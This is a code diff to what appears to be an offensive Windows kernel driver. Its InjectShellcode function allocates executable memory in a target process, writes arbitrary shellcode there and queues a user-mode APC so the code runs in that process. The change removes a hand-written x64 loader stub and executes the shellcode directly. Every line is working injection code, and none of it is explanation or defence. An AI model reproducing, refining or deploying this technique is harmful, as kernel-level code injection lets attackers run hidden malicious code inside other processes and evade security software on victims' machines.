@@ -39,24 +39,10 @@ NTSTATUS InjectShellcode(ShellcodeInformation* ShellcodeInformation) {
 	PKAPC ShellcodeApc = NULL;
 	PKAPC PrepareApc = NULL;
 	PVOID shellcodeAddress = NULL;
-	PVOID shellcodeLoaderAddress = NULL;
-	SIZE_T pageSize = PAGE_SIZE;
 	NTSTATUS status = STATUS_SUCCESS;
 	SIZE_T shellcodeSize = ShellcodeInformation->ShellcodeSize;
-	HANDLE pid = UlongToHandle(ShellcodeInformation->Pid);
 
-	UCHAR shellcodeLoader[] = {
-		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	// mov		rax, 0x00
-		0x48, 0x83, 0xEC, 0x28,										// sub		rsp, 0x28
-		0x49, 0x89, 0xC8,											// mov		r8 , rcx
-		0x4C, 0x8D, 0x4C, 0x24, 0x20,								// lea		r9 , [rsp+0x20]
-		0x48, 0x31, 0xC9,											// xor		rcx, rcx
-		0x48, 0x31, 0xD2,											// xor		rdx, rdx
-		0xFF, 0xD0,													// call		rax
-		0x48, 0x83, 0xC4, 0x28,										// add		rsp, 0x28
-		0xC3														// ret
-	};
-	SIZE_T shellcodeLoaderSize = sizeof(shellcodeLoader);
+	HANDLE pid = UlongToHandle(ShellcodeInformation->Pid);
 	status = PsLookupProcessByProcessId(pid, &TargetProcess);
 
 	if (!NT_SUCCESS(status))
@@ -80,36 +66,12 @@ NTSTATUS InjectShellcode(ShellcodeInformation* ShellcodeInformation) {
 
 	if (!NT_SUCCESS(status))
 		goto CleanUp;
-	
-	// status = ZwAllocateVirtualMemory(hProcess, &shellcode, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
-	
-	// status = ZwAllocateVirtualMemory(hProcess, &shellcodeLoaderAddress, 0, &pageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	status = ZwAllocateVirtualMemory(hProcess, &shellcodeLoaderAddress, 0, &pageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	status = ZwAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
 
 	if (!NT_SUCCESS(status))
 		goto CleanUp;
 
-	// status = ZwAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	status = ZwAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &pageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-	if (!NT_SUCCESS(status))
-		goto CleanUp;
-
-	// Preparing the shellcode loader.
-	__try {
-		RtlCopyMemory(shellcodeLoader + 2, &shellcodeAddress, 8);
-	}
-	__except (EXCEPTION_EXECUTE_HANDLER) {
-		KdPrint((DRIVER_PREFIX "Failed to copy the shellcode, 0x%x\n", GetExceptionCode()));
-		goto CleanUp;
-	}
-
-	status = KeWriteProcessMemory((PVOID)&shellcodeLoader[0], TargetProcess, shellcodeLoaderAddress, shellcodeLoaderSize, KernelMode);
-
-	if (!NT_SUCCESS(status))
-		goto CleanUp;
-
-	// Writing the actual shellcode.
 	status = KeWriteProcessMemory(ShellcodeInformation->Shellcode, TargetProcess, shellcodeAddress, shellcodeSize, UserMode);
 
 	if (!NT_SUCCESS(status))
@@ -125,7 +87,7 @@ NTSTATUS InjectShellcode(ShellcodeInformation* ShellcodeInformation) {
 	}
 	
 	dimGlobals.KeInitializeApc(PrepareApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)PrepareApcCallback, NULL, NULL, KernelMode, NULL);
-	dimGlobals.KeInitializeApc(ShellcodeApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)ApcInjectionCallback, NULL, (PKNORMAL_ROUTINE)shellcodeLoaderAddress, UserMode, ShellcodeInformation->Parameter1);
+	dimGlobals.KeInitializeApc(ShellcodeApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)ApcInjectionCallback, NULL, (PKNORMAL_ROUTINE)shellcodeAddress, UserMode, ShellcodeInformation->Parameter1);
 
 	if (!dimGlobals.KeInsertQueueApc(ShellcodeApc, ShellcodeInformation->Parameter2, ShellcodeInformation->Parameter3, FALSE)) {
 		status = STATUS_UNSUCCESSFUL;
@@ -142,12 +104,8 @@ NTSTATUS InjectShellcode(ShellcodeInformation* ShellcodeInformation) {
 
 CleanUp:
 	if (!NT_SUCCESS(status)) {
-		if (shellcodeLoaderAddress)
-			// ZwFreeVirtualMemory(hProcess, &shellcodeLoaderAddress, &shellcodeLoaderSize, MEM_DECOMMIT);
-			ZwFreeVirtualMemory(hProcess, &shellcodeLoaderAddress, &pageSize, MEM_DECOMMIT);
 		if (shellcodeAddress)
-			// ZwFreeVirtualMemory(hProcess, &shellcodeAddress, &shellcodeSize, MEM_DECOMMIT);
-			ZwFreeVirtualMemory(hProcess, &shellcodeAddress, &pageSize, MEM_DECOMMIT);
+			ZwFreeVirtualMemory(hProcess, &shellcodeAddress, &shellcodeSize, MEM_DECOMMIT);
 		if (PrepareApc)
 			ExFreePoolWithTag(PrepareApc, DRIVER_TAG);
 		if (ShellcodeApc)
